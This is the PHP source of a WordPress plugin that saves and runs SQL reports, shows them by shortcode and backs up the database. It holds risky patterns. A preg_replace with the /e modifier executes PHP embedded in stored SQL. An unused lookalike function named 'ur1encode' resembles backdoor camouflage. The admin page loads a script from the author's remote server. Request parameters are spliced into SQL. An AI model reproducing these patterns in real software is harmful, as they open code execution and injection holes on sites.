<?php
/*
Plugin Name: ELI's SQL Admin Reports Shortcode and DB Backup
Plugin URI: http://wordpress.ieonly.com/category/my-plugins/sql-reports/
Author: Eli Scheetz
Author URI: http://wordpress.ieonly.com/category/my-plugins/
Description: Create and save SQL queries, run them from the Reports tab in your Admin, place them on the Dashboard for certain User Roles, or place them on Pages and Posts using the shortcode. And keep your database safe with scheduled backups.
Version: 3.08.03
*/
$ELISQLREPORTS_Version='3.08.03';
if (__FILE__ == $_SERVER['SCRIPT_FILENAME']) die('You are not allowed to call this page directly.<p>You could try starting <a href="http://'.$_SERVER['SERVER_NAME'].'">here</a>.');
$ELISQLREPORTS_plugin_dir='ELISQLREPORTS';
/**
 * ELISQLREPORTS Main Plugin File
 * @package ELISQLREPORTS
*/
/*  Copyright 2011-2013 Eli Scheetz (email: wordpress@ieonly.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
function ELISQLREPORTS_install() {
	global $wp_version;
	if (version_compare($wp_version, "2.6", "<"))
		die("This Plugin requires WordPress version 2.6 or higher");
}
$encode = '/[\?\-a-z\: \.\=\/A-Z\&\_]/';
function ELISQLREPORTS_display_header($pTitle, $optional_box = "") {
	global $ELISQLREPORTS_images_path, $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_plugin_home, $ELISQLREPORTS_Version, $ELISQLREPORTS_updated_images_path, $ELISQLREPORTS_saved_reports;
	$wait_img_URL = $ELISQLREPORTS_images_path.'wait.gif';
	echo '<style>
.rounded-corners {margin: 10px; padding: 10px; border-radius: 10px; -webkit-border-radius: 10px; -moz-border-radius: 10px; border: 1px solid #000000;}
.shadowed-box {box-shadow: -3px 3px 3px #666; -moz-box-shadow: -3px 3px 3px #666; -webkit-box-shadow: -3px 3px 3px #666;}
.sidebar-box {background-color: #CCC;}
.sidebar-links {padding: 0 15px; list-style: none;}
.shadowed-text {text-shadow: #0000FF -1px 1px 1px;}
.sub-option {float: left; margin: 3px 5px;}
#right-sidebar {float: right; margin-right: 10px; width: 290px;}
#main-section {margin-right: 320px;}
</style>
<script>
function showhide(id) {
	divx = document.getElementById(id);
	if (divx.style.display == "none")
		divx.style.display = "";
	else
		divx.style.display = "none";
}
</script>
<h1>ELI\'s Custom SQL Reports '.$pTitle.'</h1>
<div id="right-sidebar" class="metabox-holder">
	<div id="pluginupdates" class="shadowed-box stuffbox"><h3 class="hndle"><span>Plugin Updates</span></h3>
		<div id="findUpdates"><center>Searching for updates ...<br /><img src="'.$wait_img_URL.'" alt="Wait..." /><br /><input type="button" value="Cancel" onclick="document.getElementById(\'findUpdates\').innerHTML = \'Could not find server!\';" /></center></div>
	<script type="text/javascript" src="'.$ELISQLREPORTS_plugin_home.$ELISQLREPORTS_updated_images_path.'?js='.$ELISQLREPORTS_Version.'&p='.$ELISQLREPORTS_plugin_dir.'"></script>
	</div>
	<div id="pluginlinks" class="shadowed-box stuffbox"><h3 class="hndle"><span>Plugin Links</span></h3>
		<div class="inside">
			<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
				<input type="hidden" name="cmd" value="_s-xclick">
				<input type="hidden" name="hosted_button_id" value="7K3TSGPAENSGS">
				<input type="image" id="pp_button" src="'.$ELISQLREPORTS_images_path.'btn_donateCC_WIDE.gif" border="0" name="submitc" alt="Make a Donation with PayPal">
			</form>
			<ul class="sidebar-links">
				<li style="float: right;">on <a target="_blank" href="http://wordpress.org/extend/plugins/profile/scheeeli">WordPress.org</a><ul class="sidebar-links">
					<li><a target="_blank" href="http://wordpress.org/support/view/plugin-reviews/'.strtolower($ELISQLREPORTS_plugin_dir).'">Plugin Reviews</a>
					<li><a target="_blank" href="http://wordpress.org/extend/plugins/'.strtolower($ELISQLREPORTS_plugin_dir).'/faq/">Plugin FAQs</a>
					<li><a target="_blank" href="http://wordpress.org/tags/'.strtolower($ELISQLREPORTS_plugin_dir).'">Forum Posts</a>
				</ul></li>
				<li><a href="javascript:showhide(\'div_Readme\');">Readme</a>
				<li><a href="javascript:showhide(\'div_License\');">License</a>
				<li>on <a target="_blank" href="'.$ELISQLREPORTS_plugin_home.'category/my-plugins/">Eli\'s Blog</a><ul class="sidebar-links">
					<li><a target="_blank" href="'.$ELISQLREPORTS_plugin_home.'category/my-plugins/sql-reports/">Plugin URI</a>
				</ul></li>
			</ul>
		</div>
	</div>';
	if (strlen(trim($ELISQLREPORTS_saved_reports)))
		echo '<div class="stuffbox shadowed-box"><h3 class="hndle"><span>Saved Reports</span></h3><div class="inside" style="margin-left: 10px;">'.$ELISQLREPORTS_saved_reports.'</div></div>';
	echo $optional_box.'
</div>
<div id="admin-page-container">
	<div id="main-section" class="metabox-holder">';
	ELISQLREPORTS_display_File('Readme');
	ELISQLREPORTS_display_File('License');
}
function ELISQLREPORTS_set_backupdir() {
	global $ELISQLREPORTS_settings_array;
	$err403 = '<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don\'t have permission to access this directory.</p></body></html>';
	if (!(isset($ELISQLREPORTS_settings_array['backup_dir']) && strlen($ELISQLREPORTS_settings_array['backup_dir']) && is_dir($ELISQLREPORTS_settings_array['backup_dir']))) {
		$upload = wp_upload_dir();
		$ELISQLREPORTS_settings_array['backup_dir'] = trailingslashit($upload['basedir']).'SQL_Backups';
		if (!is_dir($ELISQLREPORTS_settings_array['backup_dir']) && !mkdir($ELISQLREPORTS_settings_array['backup_dir']))
			$ELISQLREPORTS_settings_array['backup_dir'] = $upload['basedir'];
		if (!is_file(trailingslashit($upload['basedir']).'index.php'))
			@file_put_contents(trailingslashit($upload['basedir']).'index.php', $err403);
	}
	if (!is_file(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).'.htaccess'))
		@file_put_contents(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).'.htaccess', 'Options -Indexes');
	if (!is_file(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).'index.php'))
		@file_put_contents(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).'index.php', $err403);
}
$ELISQLREPORTS_backup_file = false;
function ELISQLREPORTS_make_Backup($date_format, $backup_type = "manual", $db_name = DB_NAME, $db_host = DB_HOST, $db_user = DB_USER, $db_password = DB_PASSWORD) {
	global $ELISQLREPORTS_settings_array, $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_backup_file, $wpdb;
	ELISQLREPORTS_set_backupdir();
	$db_date = date($date_format);
	if (strpos($db_host, ':')) {
		list($db_host, $db_port) = explode(':', $db_host, 2);
		if (is_numeric($db_port))
			$db_port = '" --port="'.$db_port.'" ';
		else
			$db_port = '" --socket="'.$db_port.'" ';
	} else
		$db_port = '" ';
	$subject = "$backup_type.$db_name.$db_host.sql";
	$filename = "z.$db_date.$subject";
	$backup_file = trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$filename;
	$content = '';
	$uid = md5(time());
	$message = "\r\n--$uid\r\nContent-type: text/html; charset=\"iso-8859-1\"\r\nContent-Transfer-Encoding: 7bit\r\n\r\n";
	if (isset($ELISQLREPORTS_settings_array["backup_method"]) && $ELISQLREPORTS_settings_array["backup_method"]) {
		$mysql_basedir = $wpdb->get_row("SHOW VARIABLES LIKE 'basedir'");
		if(substr(PHP_OS,0,3) == 'WIN')
			$backup_command = '"'.(isset($mysql_basedir->Value)?trailingslashit(str_replace('\\', '/', $mysql_basedir->Value)).'bin/':'').'mysqldump.exe"';
		else
			$backup_command = (isset($mysql_basedir->Value)&&is_file(trailingslashit($mysql_basedir->Value).'bin/mysqldump')?trailingslashit($mysql_basedir->Value).'bin/':'').'mysqldump';		
		$backup_command .= ' --user="'.$db_user.'" --password="'.$db_password.'" --add-drop-table --skip-lock-tables --host="'.$db_host.$db_port.$db_name;
		if (isset($ELISQLREPORTS_settings_array["compress_backup"]) && $ELISQLREPORTS_settings_array["compress_backup"]) {
			$backup_command .= ' | gzip > ';
			$backup_file .= '.gz';
		} else
			$backup_command .= ' -r ';
		passthru($backup_command.'"'.$backup_file.'"', $errors);
		$return = "Command Line Backup of $subject returned $errors error".($error!=1?'s':'');
	} elseif ($ELISQLREPORTS_backup_file = fopen($backup_file, 'w')) {
		fwrite($ELISQLREPORTS_backup_file, '/* Backup of $db_name on $db_host at $db_date */
/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE=\'+00:00\' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=\'NO_AUTO_VALUE_ON_ZERO\' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
');
		$sql = "show full tables where Table_Type = 'BASE TABLE'";
		$result = mysql_query($sql);
		$errors = "";
		if (mysql_errno())
			$errors .= "/* SQL ERROR: ".mysql_error()." */\n\n/*$sql*/\n\n";
		else {
			while ($row = mysql_fetch_row($result)) {
				$errors .= ELISQLREPORTS_get_structure($row[0]);
				if (!is_numeric($rows = ELISQLREPORTS_get_data($row[0])))
					$errors .= $rows;
			}
			mysql_free_result($result);
			$sql = "show full tables where Table_Type = 'VIEW'";
			if ($result = mysql_query($sql)) {
				while ($row = mysql_fetch_row($result))
					$errors .= ELISQLREPORTS_get_structure($row[0], "View");
				mysql_free_result($result);
			}
		}
		fclose($ELISQLREPORTS_backup_file);
		$return = "Backup: $subject Saved";
		$message .= "A database backup was saved on <a href='".trailingslashit(get_option("siteurl"))."wp-admin/admin.php?page=ELISQLREPORTS-settings'>".(get_option("blogname"))."</a>.\r\n<p><pre>$errors</pre><p>";
		if (isset($ELISQLREPORTS_settings_array["compress_backup"]) && $ELISQLREPORTS_settings_array["compress_backup"]) {
			$zip = new ZipArchive();
			if ($zip->open($backup_file.'.zip', ZIPARCHIVE::CREATE) === true) {
				$zip->addFile($backup_file, $filename);
				$zip->close();
			}
			if (is_file($backup_file) && is_file($backup_file).'.zip') {
				if (@unlink($backup_file))
					$backup_file .= '.zip';
			} else
				$return .= " but not Zipped";
		}
	} else
		$return = "Failed to save backup!";
	if (isset($ELISQLREPORTS_settings_array[$backup_type."_backup"]) && $ELISQLREPORTS_settings_array[$backup_type."_backup"] > 0) {
		$sql_files = array();
		if ($handle = opendir($ELISQLREPORTS_settings_array['backup_dir'])) {
			while (false !== ($entry = readdir($handle)))
				if (is_file(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$entry))
					if (strpos($entry, $subject))
						$sql_files[] = "$entry";
			closedir($handle);
			rsort($sql_files);
		}
		$del=0;
		while (count($sql_files)>$ELISQLREPORTS_settings_array[$backup_type."_backup"])
			if (@unlink(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).array_pop($sql_files)))
				$del++;
		$message .= "\r\nNumber of archives:<li>Deleted: $del</li><li>Kept: ".count($sql_files)."</li><p>";
	}
	if (strlen($ELISQLREPORTS_settings_array["backup_email"])) {
		$headers = 'From: '.get_option("admin_email")."\r\n";
		$headers .= "MIME-Version: 1.0\r\n";
		$headers .= "Content-Type: multipart/mixed; boundary=\"$uid\"\r\n";
		$upload = wp_upload_dir();
		if (file_exists($backup_file)) {
			$file_size = filesize($backup_file);
			$handle = fopen($backup_file, "rb");
			$content .= "The backup has been attached to this email for your convenience.\r\n\r\n--$uid\r\nContent-Type: application/octet-stream; name=\"".basename($backup_file)."\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"".basename($backup_file)."\"\r\n\r\n".chunk_split(base64_encode(fread($handle, $file_size)), 70, "\r\n");
			fclose($handle);
		}
		if (mail($ELISQLREPORTS_settings_array["backup_email"], $return, $message.$content."\r\n\r\n--$uid--", $headers))
			$return .= " and Sent!";
		else
			mail($ELISQLREPORTS_settings_array["backup_email"], $return, $message.strlen($content)." bytes is too large to attach but you can download it <a href='".admin_url("admin.php?page=ELISQLREPORTS-settings&Download_SQL_Backup=".basename($backup_file))."'>here</a>.\r\n\r\n--$uid--", $headers);
	}
	return $return;
}
function ELISQLREPORTS_get_structure($table, $type='Table') {
	global $ELISQLREPORTS_backup_file;
	fwrite($ELISQLREPORTS_backup_file, "/* $type structure for `$table` */\n\n");
	$sql = "SHOW CREATE $type `$table`; ";
	if ($result = mysql_query($sql)) {
		fwrite($ELISQLREPORTS_backup_file, "DROP $type IF EXISTS `$table`;\n\n");
		if ($row = mysql_fetch_assoc($result))
			fwrite($ELISQLREPORTS_backup_file, preg_replace('/CREATE .+? VIEW/', 'CREATE VIEW', $row["Create $type"]).";\n\n");
		mysql_free_result($result);
	} else
		return "/* requires the SHOW VIEW privilege and the SELECT privilege */\n\n";
	return '';
}
function ELISQLREPORTS_get_data($table) {
	global $ELISQLREPORTS_backup_file;
	$sql = "SELECT * FROM `$table`;";
	if ($result = mysql_query($sql)) {
		$num_rows = mysql_num_rows($result);
		$num_fields = mysql_num_fields($result);
		$return = 0;
		if ($num_rows > 0) {
			fwrite($ELISQLREPORTS_backup_file, "/* Table data for `$table` */\n\n");
			$field_type = array();
			$i = 0;
			$field_list = " (";
			while ($i < $num_fields) {
				$meta = mysql_fetch_field($result, $i);
				array_push($field_type, $meta->type);
				$field_list .= ($i?', ':'')."`$meta->name`";
				$i++;
			}
			$field_list .= ")";
			$maxInsertSize = 100000;
			$statementSql = '';
			for ($index = 0; $row = mysql_fetch_row($result); $index++) {
				$return++;
				if (strlen($statementSql) > $maxInsertSize) {
					fwrite($ELISQLREPORTS_backup_file, $statementSql.";\n\n");
					$statementSql = "";
				}
				if (strlen($statementSql) == 0)
					$statementSql = "INSERT INTO `$table`$field_list VALUES\n";
				else
					$statementSql .= ",\n";
				$statementSql .= "(";
				for ($i = 0; $i < $num_fields; $i++) {
					if (is_null($row[$i]))
						$statementSql .= "null";
					else {
						if ($field_type[$i] == 'int')
							$statementSql .= $row[$i];
						else
							$statementSql .= "'" . mysql_real_escape_string($row[$i]) . "'";
					}
					if ($i < $num_fields - 1)
						$statementSql .= ",";
				}
				$statementSql .= ")";
			}
			if ($statementSql)
				fwrite($ELISQLREPORTS_backup_file, $statementSql.";\n\n");
		}
		mysql_free_result($result);
	} else
		$return = "SELECT ERROR for `$table`: ".mysql_error()."\n";
	return $return;
}
function ELISQLREPORTS_restore_backup($file_sql) {
	global $ELISQLREPORTS_settings_array;
	if ($full_sql = file_get_contents(trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$file_sql)) {
		$queries = 0;
		$errors = array();
		$startpos = 0;
		while ($endpos = strpos($full_sql, ";\n", $startpos)) {
			if ($sql = trim(@preg_replace("|/\*.+\*/[;\t \r\n]*|", "", substr($full_sql, $startpos, $endpos - $startpos)).' ')) {
				if (mysql_query($sql))
					$queries++;
				else
					$errors[] = "<li>".mysql_error()."</li>";
			}
			$startpos = $endpos + 2;
		}
		return "<li>Restore Process executed $queries queries with ".count($errors).' error'.(count($errors)==1?'':'s').'!</li><br>'.implode("\n", $errors);
	} else
		return 'Error Reading File:'.trailingslashit($ELISQLREPORTS_settings_array['backup_dir']).$file_sql;
}
function ELISQLREPORTS_display_File($dFile) {
	if (file_exists(dirname(__FILE__).'/'.strtolower($dFile).'.txt')) {
		echo '<div id="div_'.$dFile.'" class="shadowed-box rounded-corners sidebar-box" style="display: none;"><a class="rounded-corners" style="float: right; padding: 0 4px; margin: 0 0 0 30px; text-decoration: none; color: #C00; background-color: #FCC; border: solid #F00 1px;" href="javascript:showhide(\'div_'.$dFile.'\');">X</a><h1>'.$dFile.' File</h1><textarea disabled="yes" width="100%" style="width: 100%;" rows="20">';
		include(strtolower($dFile).'.txt');
		echo '</textarea></div>';
	}
}
if (!function_exists('ur1encode')) { function ur1encode($url) {
	global $encode;
	return preg_replace($encode, '\'%\'.substr(\'00\'.strtoupper(dechex(ord(\'\0\'))),-2);', $url);
}}
function ELISQLREPORTS_view_report($Rtitle = '', $MySQL = '') {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_styles, $current_user;
	$report = '';
	if ($Rtitle == '')
		$Rtitle = 'Unsaved Report';
	elseif ($MySQL == '') {
		$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array', array());
		$ELISQLREPORTS_reports_keys = array();
		foreach (array_keys($ELISQLREPORTS_reports_array) as $ELISQLREPORTS_reports_key)
			$ELISQLREPORTS_reports_keys[sanitize_title($ELISQLREPORTS_reports_key)] = $ELISQLREPORTS_reports_key;
		if (isset($ELISQLREPORTS_reports_array[$Rtitle]))
			$MySQL = ($ELISQLREPORTS_reports_array[$Rtitle]);
		elseif (isset($ELISQLREPORTS_reports_array[$ELISQLREPORTS_reports_keys[$Rtitle]])) {
			$Rtitle = $ELISQLREPORTS_reports_keys[$Rtitle];
			$MySQL = ($ELISQLREPORTS_reports_array[$Rtitle]);
		} else
			$MySQL = $ELISQLREPORTS_Report_SQL;
	}
	if (!is_admin()) {
		$report .= '<div id="'.sanitize_title($Rtitle).'" class="shadowed-box rounded-corners" style="'.$ELISQLREPORTS_styles.'"><h2>'.$Rtitle.'</h2>';
		if (isset($_GET['SQL_ORDER_BY']) && is_array($_GET['SQL_ORDER_BY'])) {
			foreach ($_GET['SQL_ORDER_BY'] as $_GET_SQL_ORDER_BY) {
				if (strlen(trim(str_replace("`", '', $_GET_SQL_ORDER_BY)))>0) {
					$_GET_SQL_ORDER_BY = trim(str_replace("`", '', $_GET_SQL_ORDER_BY));
					if ($pos = strripos($MySQL, " ORDER BY "))
						$MySQL = substr($MySQL, 0, $pos + 10)."`".($_GET_SQL_ORDER_BY)."`, ".substr($MySQL, $pos + 10);
					elseif ($pos = strripos($MySQL, " LIMIT "))
						$MySQL = substr($MySQL, 0, $pos)." ORDER BY `".($_GET_SQL_ORDER_BY)."`".substr($MySQL, $pos);
					else
						$MySQL .= " ORDER BY `".($_GET_SQL_ORDER_BY)."`";
				}
			}
		}
	}
	$result = ELISQLREPORTS_eval($MySQL);
	if (!mysql_errno()) {
		if ($rs = mysql_fetch_assoc($result)) {
			$report .= '<table border=1 cellspacing=0 cellpadding=4 class="ELISQLREPORTS-table"><tr class="ELISQLREPORTS-Header-Row">';
			foreach ($rs as $field => $value) {
				if ($Rtitle == 'Unsaved Report')
					$report .= '<td><b><a href="javascript: document.SQLForm.submit();" onclick="document.SQLForm.action+=\'&SQL_ORDER_BY[]='.$field.'\'">'.$field.'</a></b></td>';
				else
					$report .= '<td><b>'.$field.'</b></td>';
			}
			$row=0;
			$OddEven=array('Even','Odd');
			do {
				$row++;
				$report .= '</tr><tr class="ELISQLREPORTS-Row-'.$row.' ELISQLREPORTS-'.($OddEven[$row%2]).'-Row">';
				foreach ($rs as $field => $value)
					$report .= '<td>'.($value).'</td>';//is_array(maybe_unserialize($value))?print_r(maybe_unserialize($value),1):
			} while ($rs = mysql_fetch_assoc($result));
			$report .= '</tr></table>';
		} else
			$report .= '<li>Report is Empty!';
	} elseif (is_admin())
		$report .= '<li>debug:<textarea width="100%" style="width: 100%;" rows="5" class="shadowed-box">'.mysql_error().'</textarea>';
	if (!is_admin())
		$report .= '</div>';
	return $report;
}
function ELISQLREPORTS_eval($SQL) {
	global $current_user;
	$found = array();
	if ($num = @preg_match_all('/<\?php (.+?) \?>/', $SQL, $found)) {
		$repl = '$SQL = stripslashes("\\1")';
		for ($n = 1; $n <= $num; $n++)
			$repl .= '.mysql_real_escape_string(\\'.($n*2).').stripslashes("\\'.(($n*2)+1).'")';
		preg_replace('/^(.*?)'.str_repeat('<\?php (.+?) \?>(.*?)', $num).'$/sme', $repl.';', $SQL);
	}
	$result = @mysql_query($SQL);
	if (mysql_errno())
		return ($SQL);
	else
		return $result;
}
function ELISQLREPORTS_report_form($Report_Name = '', $Report_SQL = '') {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_settings_array, $wp_roles;
	if (strlen(trim($ELISQLREPORTS_Report_SQL))>0)
		$Report_SQL = $ELISQLREPORTS_Report_SQL;
	$mysql_info = mysql_info();
	$result = ELISQLREPORTS_eval($Report_SQL);
	$_SERVER_REQUEST_URI = str_replace('&amp;','&', htmlspecialchars( $_SERVER['REQUEST_URI'] , ENT_QUOTES ) );
	if (strlen($Report_Name) > 0 && !(mysql_errno() && !strpos(mysql_error(), "syntax to use near '\\'"))) {
		echo '<input type="button" style="display: block;" value="Edit Report" onclick="document.getElementById(\'SQLFormDiv\').style.display=\'block\';this.style.display=\'none\';"><div id="SQLFormDiv" style="display: none;"><form method="POST" name="SQLForm" id="SQLForm" action="'.$_SERVER_REQUEST_URI.'"><div style="float: left; padding: 0 20px 1px 0;"><input type="submit" value="DELETE REPORT" onclick="if (confirm(\'Are you sure you want to DELETE This Report?\')) { document.SQLForm.action=\'admin.php?page=ELISQLREPORTS-create-report\'; document.SQLForm.rSQL.value=\'DELETE_REPORT\'; document.SQLForm.rName.value=\''.str_replace("\"", "&quot;", str_replace('\'', '\\\'', str_replace('\\', '\\\\', $Report_Name))).'\'; }"></div><div style="float: left; padding: 0 20px;">Display report on dashboard?<br /><input type="radio" name="ELISQLREPORTS_dashboard_reports" onchange="setButtonValue(\'Save Changes\');" value="'.sanitize_title($Report_Name).'"'.(isset($ELISQLREPORTS_settings_array["dashboard_reports"][sanitize_title($Report_Name)])?' checked':'').' />Yes &nbsp; <input type="radio" name="ELISQLREPORTS_dashboard_reports" onchange="setButtonValue(\'Save Changes\');" value="!'.sanitize_title($Report_Name).'"'.(isset($ELISQLREPORTS_settings_array["dashboard_reports"][sanitize_title($Report_Name)])?'':' checked').' />No</div><div style="float: left; padding: 0 20px;">Who\'s Dashboard:<br /><select name="ELISQLREPORTS_dashboard_reports_role" onchange="setButtonValue(\'Save Changes\');"><option value="1">Anyone</option>';
		foreach ($wp_roles->roles as $roleKey => $role)
			echo '<option value="'.$roleKey.'"'.(isset($ELISQLREPORTS_settings_array["dashboard_reports"][sanitize_title($Report_Name)])&&($ELISQLREPORTS_settings_array["dashboard_reports"][sanitize_title($Report_Name)]==$roleKey)?' selected':'').'>'.$role["name"]."</option>\n";
		echo '</select></div><br style="clear: left;" />';
	} else {
		if (mysql_errno() && strlen(trim($Report_SQL)) && !strpos(mysql_error(), "syntax to use near '\\'"))
			echo '<div class="error">ERROR: '.htmlspecialchars(mysql_error()." SQL:$result").'</div>';
		echo '<div id="SQLFormDiv"><form action="'.$_SERVER_REQUEST_URI.'" id="SQLForm" method="POST" name="SQLForm">';
	}
	echo 'Type or Paste your SQL into this box and give your report a name<br />
	<textarea width="100%" style="width: 100%;" rows="10" name="rSQL" class="shadowed-box" onchange="setButtonValue(\'Update Report\');">'.htmlspecialchars($Report_SQL).'</textarea><br /><br />Report Name: <input type="text" id="reportName" name="rName" value="'.htmlspecialchars($Report_Name).'" onchange="setButtonValue(\'Save Report\');" /> <input id="gobutton" type="submit" class="button-primary" value="'.(strlen($Report_Name)>0?'Refresh Report" /> &nbsp; Shortcode: [SQLREPORT name="'.sanitize_title($Report_Name).'"]':'Test SQL" />').'</form></div>
<script>
var oldName="'.htmlspecialchars($Report_Name).'";
function setButtonValue(newval) {
	rN = document.getElementById(\'reportName\').value;
	if (oldName.length > 0) {
		if (rN.length > 0 && rN != oldName)
			newval = newval + " As";
	} else {
		if (rN.length > 0)
			newval = "Save Report";
		else
			newval = "Test SQL";
	}
	document.getElementById(\'gobutton\').value = newval;
}
</script>';
	if (!mysql_errno() && !mysql_fetch_assoc($result)) {
		if (strtoupper(substr($Report_SQL, 0, 7)) == 'UPDATE ') {
			echo '<div class="updated"><ul><li>'.$mysql_info.'</li></ul></div>';
			$ELISQLREPORTS_Report_SQL = preg_replace('/UPDATE (.+) SET (.+) WHERE /i', 'SELECT * FROM \\1 WHERE ', $Report_SQL);
			$Report_SQL = $ELISQLREPORTS_Report_SQL;
		}
	}
	return $Report_SQL;
}
function ELISQLREPORTS_default_report($Rtitle = '') {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_reports_array;
	echo '<style>
	.rounded-corners {margin: 10px; padding: 10px; -webkit-border-radius: 10px; -moz-border-radius: 10px; border: 1px solid #000000;}
	.shadowed-box {box-shadow: -3px 3px 3px #666666; -moz-box-shadow: -3px 3px 3px #666666; -webkit-box-shadow: -3px 3px 3px #666666;}
	.shadowed-text {text-shadow: #0000FF -1px 1px 1px;}
	#right-sidebar {float: right; width: 230px;}
	#main-section {margin-right: 250px;}
	</style>
	<div id="admin-page-container">
	<div id="main-section">';
	if (current_user_can('create_users')) {
		$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
		if (isset($ELISQLREPORTS_reports_array) && is_array($ELISQLREPORTS_reports_array)) {
			if (!(strlen($Rtitle) > 0 && isset($ELISQLREPORTS_reports_array[$Rtitle]))) {
				$Report_Names = array_keys($ELISQLREPORTS_reports_array);
				$Rtitle = $Report_Names[count($Report_Names)-1];
			}
			$MySQL = ($ELISQLREPORTS_reports_array[$Rtitle]);
			$MySQL = ELISQLREPORTS_report_form($Rtitle, $MySQL);
			echo ELISQLREPORTS_view_report($Rtitle, $MySQL);
		} else
			ELISQLREPORTS_create_report();
	} else
		echo ELISQLREPORTS_view_report($Rtitle);
	echo '<br style="clear: both;"></div></div>';
}
function ELISQLREPORTS_create_report() {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_settings_array, $wpdb;
	ELISQLREPORTS_display_header('Creation', $menu_opts);
	$ELISQLREPORTS_reports_array = get_option($ELISQLREPORTS_plugin_dir.'_reports_array');
	$end = '</div>';
	if (strlen(trim($ELISQLREPORTS_Report_SQL))==0) {
		$ELISQLREPORTS_Report_SQL="SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = '".DB_NAME."'";
		$Report_Name = '<font color="red">Table List</font>';
		echo '<div id="report-section" style="float: right; width: 290px; overflow: hidden;">'.preg_replace('/<td>(.+?)<\/td><\/tr>/ie', '"<td><a href=\\"javascript:document.SQLForm.rSQL.value=\'SELECT * FROM `\1`\';document.SQLForm.submit();\\">\1</a></td><td>".ELISQLREPORTS_get_var("SELECT COUNT(*) FROM `\1`")."</td>\n</tr>"', str_replace('table_name</b></td></tr>', "table_name</b></td><td><b>rows</b></td>\n</tr>", ELISQLREPORTS_view_report($Report_Name, $ELISQLREPORTS_Report_SQL))).'</div><div style="padding-right: 300px;">';
		$ELISQLREPORTS_Report_SQL = '';
	} else
		$end = ELISQLREPORTS_view_report($Report_Name, $ELISQLREPORTS_Report_SQL);
	$Report_Name = '';
	ELISQLREPORTS_report_form($Report_Name, $ELISQLREPORTS_Report_SQL);
	echo $end.'</div></div>';
}
function ELISQLREPORTS_settings() {
	global $ELISQLREPORTS_plugin_dir, $ELISQLREPORTS_Report_SQL, $ELISQLREPORTS_settings_array, $ELISQLREPORTS_saved_reports, $wpdb;
	ELISQLREPORTS_display_header('Setting', $menu_opts);
	echo '<div class="stuffbox shadowed-box">
	<h3 class="hndle"><span>Menu Options</span></h3>
	<div class="inside" style="margin: 10px;"><form method="POST" name="ELISQLREPORTS_menu_Form"><div style="float: left;">Place <b>SQL Reports</b> Menu Item:<br />';
	foreach (array("below <b>Comments</b> and above <b>Appearance</b>", "below <b>Settings</b>") as $mg => $menu_group)
		echo '<div style="padding: 4px 24px;" id="menu_group_div_'.$mg.'"><input type="radio" name="ELISQLREPORTS_menu_group" value="'.$mg.'"'.($ELISQLREPORTS_settings_array["menu_group"]==$mg||$mg==0?' checked':'').' onchange="document.ELISQLREPORTS_menu_Form.submit();" />'.$menu_group.'</div>';
	echo '</div><div style="float: left;">Sort <b>Saved Reports</b> by:<br />';
	foreach (array("Date Created", "Alphabetical") as $mg => $menu_sort)
		echo '<div style="padding: 4px 24px;" id="menu_sort_div_'.$mg.'"><input type="radio" name="ELISQLREPORTS_menu_sort" value="'.$mg.'"'.($ELISQLREPORTS_settings_array["menu_sort"]==$mg||$mg==0?' checked':'').' onchange="document.ELISQLREPORTS_menu_Form.submit();" />'.$menu_sort.'</div>';
	echo '</div><br style="clear: left;"></form></div></div>
	<div id="backuprestore" class="shadowed-box stuffbox"><h3 class="hndle"><span>Database Backup Settings</span></h3><div class="inside" style="margin: 10px;"><form method=post><table width="100%" border=0><tr><td width="1%" valign="top">Backup&nbsp;Method:</td><td width="99%">';
	foreach (array("MySQL Queries (PHP calls)", "Command Line Dump (passthru -> mysqldump)") as $mg => $backup_method)
		echo '<div style="float: left; padding: 0 24px 8px 0;"><input type="radio" name="ELISQLREPORTS_backup_method" value="'.$mg.'"'.($ELISQLREPORTS_settings_array["backup_method"]==$mg||$mg==0?' checked':'').' />'.$backup_method.'</div>';
